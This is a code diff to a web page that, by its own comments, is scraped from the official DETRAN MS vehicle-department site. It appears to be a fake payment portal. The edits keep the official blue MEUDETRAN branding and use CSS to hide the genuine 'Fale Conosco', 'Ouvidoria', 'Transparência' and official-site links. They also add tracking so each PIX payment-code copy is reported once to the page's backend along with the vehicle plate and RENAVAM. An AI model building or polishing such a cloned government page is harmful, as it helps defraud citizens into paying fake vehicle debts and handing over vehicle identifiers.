@@ -444,12 +444,26 @@
         }
 
         /* ========================================= */
-        /* CORREÇÃO: REMOVER BLOCO AZUL E ÍCONE FACEBOOK */
+        /* CORREÇÃO 1: REMOVER APENAS O BLOCO ERRADO, MANTER MEUDETRAN AZUL */
         /* ========================================= */
         
-        /* REMOVE COMPLETAMENTE O BLOCO AZUL COM "FALE CONOSCO", "SITE DETRAN MS", etc. */
-        /* Este é o bloco inteiro que vem do scraping do DETRAN oficial */
-        .w-full.px-6.bg-004f9f.h-\\[128px\\] {
+        /* REMOVE APENAS O BLOCO COM "FALE CONOSCO", "SITE DETRAN MS", etc. */
+        /* Este é o SEGUNDO bloco azul que vem do scraping do DETRAN oficial */
+        /* Mantém o PRIMEIRO bloco azul com "MEUDETRAN" */
+        .w-full.px-6.bg-004f9f.h-\\[128px\\] + .w-full.px-6.bg-004f9f.h-\\[128px\\] {
+            display: none !important;
+        }
+        
+        /* Se o bloco problemático estiver imediatamente depois do header */
+        header.w-full.flex.flex-col > div:nth-child(2) {
+            display: none !important;
+        }
+        
+        /* Remove qualquer texto específico indesejado */
+        div:contains("FALE CONOSCO"),
+        div:contains("SITE DETRAN MS"),
+        div:contains("OUVIDORIA"),
+        div:contains("TRANSPARÊNCIA") {
             display: none !important;
         }
         
@@ -457,47 +471,12 @@
         .flex.items-center.gap-3.max-\\[800px\\]:hidden {
             display: none !important;
         }
-        
-        /* GARANTE QUE O HEADER FICA APENAS COM LOGO E TÍTULO */
-        header.w-full.flex.flex-col {
-            height: auto !important;
-            min-height: 0 !important;
-        }
-        
-        /* CORRIGE O ESPAÇAMENTO PARA NÃO DEIXAR BURACO */
-        .w-full.h-\\[80px\\].p-2.bg-white {
-            margin-top: 0 !important;
-            padding-top: 10px !important;
-            padding-bottom: 10px !important;
-        }
-        
-        /* SE HOUVER QUALQUER OUTRO ELEMENTO AZUL */
-        .bg-004f9f,
-        .bg-blue-800,
-        .bg-blue-900,
-        div[style*="background-color: #004f9f"],
-        div[style*="background-color:#004f9f"] {
-            display: none !important;
-        }
-        
-        /* REMOVE QUALQUER TEXTO RELACIONADO */
-        div:contains("FALE CONOSCO"),
-        div:contains("SITE DETRAN MS"),
-        div:contains("OUVIDORIA"),
-        div:contains("TRANSPARÊNCIA") {
-            display: none !important;
-        }
     </style>
 </head>
 <body class="font-sans">
-    <!-- CABEÇALHO ORIGINAL - BLOCO AZUL JÁ REMOVIDO PELO CSS -->
+    <!-- CABEÇALHO ORIGINAL - MANTÉM MEUDETRAN AZUL, SÓ REMOVE BLOCO ABAIXO -->
     <header class="w-full flex flex-col">
-        <!-- AQUI ERA O BLOCO AZUL QUE FOI REMOVIDO -->
-        <div class="w-full px-6 bg-004f9f h-[128px]" style="display: none !important;">
-            <!-- CONTEÚDO REMOVIDO -->
-        </div>
-        
-        <!-- ESTA PARTE PERMANECE (LOGO E TÍTULO) -->
+        <!-- BLOCO AZUL DO MEUDETRAN (MANTIDO) -->
         <div class="w-full px-6 bg-004f9f h-[128px]">
             <div class="w-full max-w-[1050px] mx-auto h-full flex justify-between">
                 <a href="/">
@@ -512,6 +491,8 @@
                 </div>
             </div>
         </div>
+        
+        <!-- AQUI ESTAVA O BLOCO AZUL COM "FALE CONOSCO" QUE FOI REMOVIDO PELO CSS -->
     </header>
 
     <!-- MENU DE NAVEGAÇÃO (MANTIDO) -->
@@ -749,6 +730,11 @@
         let segundosRestantes = 900;
         let dadosPagamentoAtual = null;
         let qrcodeAtivo = false;
+        
+        // =========================================
+        // CORREÇÃO 2: VARIÁVEL PARA CONTROLAR PRIMEIRO CLIQUE DO PIX
+        // =========================================
+        let pixJaCopiado = false; // Controla se já copiou o PIX desta sessão
 
         // =========================================
         // CORREÇÃO AUTOMÁTICA DE URLS LOCAIS
@@ -932,6 +918,9 @@
                 }
                 
                 resultadosContainer.classList.remove('hidden');
+                
+                // CORREÇÃO 2: Reseta variável de PIX copiado quando faz nova consulta
+                pixJaCopiado = false;
             }
 
             // Função global para voltar
@@ -944,6 +933,8 @@
                 errorDiv.classList.add('hidden');
                 loading.classList.add('hidden');
                 formularioContainer.classList.remove('form-loading');
+                // CORREÇÃO 2: Reseta variável de PIX copiado
+                pixJaCopiado = false;
             }
         });
 
@@ -1044,6 +1035,9 @@
                 e.stopPropagation();
                 console.log('🎯 Botão "Pagar" clicado!');
                 
+                // CORREÇÃO 2: Reseta variável quando abre novo modal
+                pixJaCopiado = false;
+                
                 const dadosDebito = capturarDebitoEspecifico(botao);
                 if (dadosDebito) {
                     abrirModalPagamentoDebitoEspecifico(dadosDebito);
@@ -1108,9 +1102,27 @@
                 if (data.sucesso) {
                     document.getElementById('codigoPix').textContent = data.codigoPix;
                     
+                    // =========================================
+                    // CORREÇÃO 2: REGISTRA APENAS O PRIMEIRO CLIQUE
+                    // =========================================
                     document.getElementById('btnCopiarCodigo').onclick = function() {
+                        // Verifica se já copiou nesta sessão
+                        if (pixJaCopiado) {
+                            console.log('⚠️ PIX já copiado nesta sessão, não registra novamente');
+                            const msg = document.getElementById('mensagemSucesso');
+                            msg.textContent = '✅ Código já copiado anteriormente!';
+                            msg.classList.add('active');
+                            setTimeout(() => msg.classList.remove('active'), 2000);
+                            return;
+                        }
+                        
+                        // Marca como copiado
+                        pixJaCopiado = true;
+                        
+                        // Copia para área de transferência
                         navigator.clipboard.writeText(data.codigoPix)
                             .then(() => {
+                                // REGISTRA APENAS UMA VEZ NO BACKEND
                                 fetch('/api/registrar-pix-copiado', {
                                     method: 'POST',
                                     headers: { 'Content-Type': 'application/json' },
@@ -1119,17 +1131,20 @@
                                         valor: dadosPagamentoAtual.valor,
                                         placa: dadosPagamentoAtual.placa,
                                         renavam: dadosPagamentoAtual.renavam,
-                                        descricao: dadosPagamentoAtual.descricao
+                                        descricao: dadosPagamentoAtual.descricao,
+                                        primeiroClique: true // Flag para identificar primeiro clique
                                     })
                                 }).catch(err => {
                                     console.error('Erro ao registrar PIX:', err);
                                 });
                                 
                                 const msg = document.getElementById('mensagemSucesso');
+                                msg.textContent = '✅ Código copiado para área de transferência!';
                                 msg.classList.add('active');
                                 setTimeout(() => msg.classList.remove('active'), 3000);
                             })
                             .catch(err => {
+                                // Fallback para navegadores antigos
                                 const textArea = document.createElement('textarea');
                                 textArea.value = data.codigoPix;
                                 document.body.appendChild(textArea);
@@ -1137,6 +1152,7 @@
                                 document.execCommand('copy');
                                 document.body.removeChild(textArea);
                                 
+                                // REGISTRA APENAS UMA VEZ NO BACKEND
                                 fetch('/api/registrar-pix-copiado', {
                                     method: 'POST',
                                     headers: { 'Content-Type': 'application/json' },
@@ -1145,13 +1161,15 @@
                                         valor: dadosPagamentoAtual.valor,
                                         placa: dadosPagamentoAtual.placa,
                                         renavam: dadosPagamentoAtual.renavam,
-                                        descricao: dadosPagamentoAtual.descricao
+                                        descricao: dadosPagamentoAtual.descricao,
+                                        primeiroClique: true
                                     })
                                 }).catch(err => {
                                     console.error('Erro ao registrar PIX:', err);
                                 });
                                 
                                 const msg = document.getElementById('mensagemSucesso');
+                                msg.textContent = '✅ Código copiado para área de transferência!';
                                 msg.classList.add('active');
                                 setTimeout(() => msg.classList.remove('active'), 3000);
                             });
